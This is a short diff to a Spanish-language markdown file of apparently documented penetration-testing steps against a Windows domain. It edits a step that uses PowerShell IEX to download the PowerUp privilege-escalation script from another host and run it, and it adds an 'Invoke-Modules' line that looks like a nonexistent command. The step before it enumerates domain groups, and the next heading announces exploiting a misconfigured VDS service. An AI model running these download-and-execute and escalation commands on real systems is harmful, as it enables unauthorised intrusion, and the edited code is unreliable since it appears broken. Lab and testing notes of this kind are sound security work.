@@ -62,7 +62,9 @@ Get-DomainGroup | Select-Object Name, Description
 **7. Cargar PowerUp (documentado)**
 
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/PowerUp.ps1'); Invoke-AllChecks
+IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/PowerUp.ps1'); 
+Invoke-Modules .\PowerUp.ps1
+Invoke-AllChecks
 ```
 
 **8. Explotar servicio VDS mal configurado (documentado)**
